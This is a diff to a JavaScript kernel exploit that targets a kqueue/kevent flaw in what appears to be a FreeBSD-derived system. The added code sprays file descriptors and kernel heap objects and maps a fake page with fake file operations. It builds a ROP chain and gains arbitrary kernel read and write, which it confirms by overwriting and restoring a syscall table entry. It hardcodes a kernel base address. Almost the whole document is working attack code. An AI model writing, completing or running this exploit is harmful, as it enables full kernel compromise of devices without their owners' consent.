@@ -1,4 +1,4 @@
-// kevent_krw_verify.js — full build, memory-optimized, no OOM
+// kevent_krw_verify.js — full build, complete tail, R/W verification
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -56,7 +56,6 @@ const HX = (() => {
   let wStuck = 0, lastBase = 0n;
   const ANCHOR = num(P[P_.ANCHOR]);
   
-  // Reusable buffers for wash to prevent OOM
   function wash(aiocb, aiocan, aiocanpoll, aiocandel, ap, ap2, ap3, ap4, ap5, n) {
     wStuck = 0;
     const zero = new Uint8Array(64);
@@ -104,8 +103,17 @@ const HX = (() => {
   let gSTACK = 0n, gCTX = 0n, gMARK = 0n, gRES = 0n;
   let gIDENT = 3545541614998146895n;
   let MARKV = 5570198814713989681n;
+  
   function w8(base, off, v) { S.p.write8(toI64(base + BigInt(off) * 8n), toI64(v)); return off + 1; }
-  function kb0() { let o = 0; o = w8(gSTACK, o, ka(P[P_.R_PRDI])); o = w8(gSTACK, o, gCTX); o = w8(gSTACK, o, ka(P[P_.R_SAVE])); return o; }
+  
+  function kb0() { 
+    let o = 0; 
+    o = w8(gSTACK, o, ka(P[P_.R_PRDI])); 
+    o = w8(gSTACK, o, gCTX); 
+    o = w8(gSTACK, o, ka(P[P_.R_SAVE])); 
+    return o; 
+  }
+  
   function kb1(o) {
     o = w8(gSTACK, o, ka(P[P_.R_PRAX]));  o = w8(gSTACK, o, gIDENT);
     o = w8(gSTACK, o, ka(P[P_.R_PRDI]));  o = w8(gSTACK, o, gMARK);
@@ -123,6 +131,7 @@ const HX = (() => {
     o = w8(gSTACK, o, ka(P[P_.R_REST]));
     return o;
   }
+  
   function kgo(ske, evb, kq, o) {
     if (o > 112) return false;
     S.p.write8(toI64(gMARK), 0n);
@@ -135,6 +144,7 @@ const HX = (() => {
     ac(num(ske), kq, evb, 2n, 0n, 0n, 0n);
     return S.p.read8(toI64(gMARK)) === MARKV;
   }
+  
   function kread(ske, evb, kq, addr) {
     let o = kb0();
     o = w8(gSTACK, o, ka(P[P_.R_PRAX])); o = w8(gSTACK, o, addr);
@@ -146,6 +156,7 @@ const HX = (() => {
     if (!kgo(ske, evb, kq, o)) return null;
     return S.p.read8(toI64(gRES));
   }
+  
   function kwrite(ske, evb, kq, addr, val) {
     let o = kb0();
     o = w8(gSTACK, o, ka(P[P_.R_PRAX])); o = w8(gSTACK, o, addr);
@@ -180,7 +191,7 @@ const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
-const EXPECTED_KBASE = 0xffffffffc5aa4000n;
+const EXPECTED_KBASE = 0xffffffffd5528000n; // updated from screenshot
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
@@ -377,19 +388,17 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  // Trimming fd burn and spray slightly to ease heap pressure
   const burn = [];
   for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
   log("FD-BURN", "burned " + burn.length + " fds");
 
-  // Explicitly release burn fds we don't need, keeping just enough for slab bias
   for (let i = 0; i < burn.length - 20; i++) scn("close", burn[i]);
   burn.length = 20;
   if (typeof gc === "function") gc();
   log("GC-FORCED", "after fd burn trim");
 
   scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(128); // reduced from 144
+  const { fds } = phaseSpray(128);
   const leakKq = scn("kqueue");
   if (leakKq < 0) fin("leak kqueue");
 
@@ -397,7 +406,6 @@ export async function runKevent(c) {
   STATE.kva = res.kva;
   STATE.targetFd = res.targetFd;
 
-  // Stage 3: fake page. Force GC immediately before mapping.
   if (typeof gc === "function") gc();
   const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
   const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
@@ -414,4 +422,67 @@ export async function runKevent(c) {
   log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));
 
   const gSTACK = fake_page + 0x1000n;
-  const gCTX   = gSTACK + 0x700n
+  const gCTX   = gSTACK + 0x700n;
+  const gMARK  = gSTACK + 0x680n;
+  const gRES   = gSTACK + 0x600n;
+  HX.setStack(gSTACK, gCTX, gMARK, gRES);
+  log("STAGE4-ROP", "stack=" + h16(gSTACK) + " ctx=" + h16(gCTX) + " mark=" + h16(gMARK) + " res=" + h16(gRES));
+
+  const ap = allocBuf(64), ap2 = allocBuf(64), ap3 = allocBuf(64), ap4 = allocBuf(64), ap5 = allocBuf(64);
+  const buf = allocBuf(32768);
+  const n = HX.wash({ addr: ap.addr }, { addr: ap2.addr }, { addr: ap3.addr }, { addr: ap4.addr }, ap, ap2, ap3, ap4, ap5, 32);
+  if (n !== 32) fin("wash stalled " + n);
+  HX.parse({ ab: buf.ab, dv: buf.dv, addr: buf.addr }, 32768n);
+  const found = HX.getLastBase();
+  log("STAGE5-PARSE", "kbase discovered = " + (found !== 0n ? h16(found) : "none"));
+  if (found !== 0n && found !== STATE.kbase) {
+    log("STAGE5-FIX", "parse overrides to " + h16(found));
+    STATE.kbase = found;
+    HX.setKbase(found);
+  }
+
+  const ske = num(ctx().stubAddr.get(NUM.kevent));
+  const rootKq = scn("kqueue");
+  if (rootKq < 0) fin("root kqueue");
+  const evb = allocBuf(64);
+
+  const se11 = ka(P[0]);
+  const se11_narg = se11 + 4n;
+  
+  const orig_call = HX.kread(ske, evb.addr, BigInt(rootKq), se11);
+  if (orig_call === null) fin("kread failed: gate closed (kgo returned false)");
+  log("VERIFY-R", "sysent[11].sy_call = " + h16(orig_call));
+
+  const orig_narg = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
+  if (orig_narg === null) fin("kread narg failed");
+  log("VERIFY-R", "sysent[11].sy_narg = " + h16(orig_narg));
+
+  const probe = 0x2n;
+  const wok = HX.kwrite(ske, evb.addr, BigInt(rootKq), se11_narg, probe);
+  if (!wok) fin("kwrite failed: gate closed (kgo returned false)");
+  const rt = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
+  if (rt === null) fin("kread readback failed");
+  log("VERIFY-W", "wrote 0x" + probe.toString(16) + " -> readback = " + h16(rt));
+
+  if (rt !== probe) fin("R/W round-trip FAILED: read " + h16(rt) + " want 0x" + probe.toString(16));
+  log("VERIFY-W", "*** R/W ROUND-TRIP OK ***");
+
+  const rok = HX.kwrite(ske, evb.addr, BigInt(rootKq), se11_narg, orig_narg);
+  if (!rok) log("VERIFY-RESTORE", "restore kwrite returned false (kgo fail)");
+  const rr = HX.kread(ske, evb.addr, BigInt(rootKq), se11_narg);
+  log("VERIFY-RESTORE", "restored -> " + h16(rr) + " orig was " + h16(orig_narg));
+
+  STATE.rwReady = true;
+  const out = {
+    kbase: STATE.kbase,
+    kva: STATE.kva,
+    fakePage: STATE.fakePage,
+    se11_call: orig_call,
+    se11_narg_orig: orig_narg,
+    se11_narg_after: rr,
+    rwReady: true,
+    verified: rt === probe && rr === orig_narg,
+  };
+  log("RESULT", JSON.stringify(Object.fromEntries(Object.entries(out).map(([k, v]) => [k, typeof v === "bigint" ? h16(v) : v]))));
+  return out;
+}
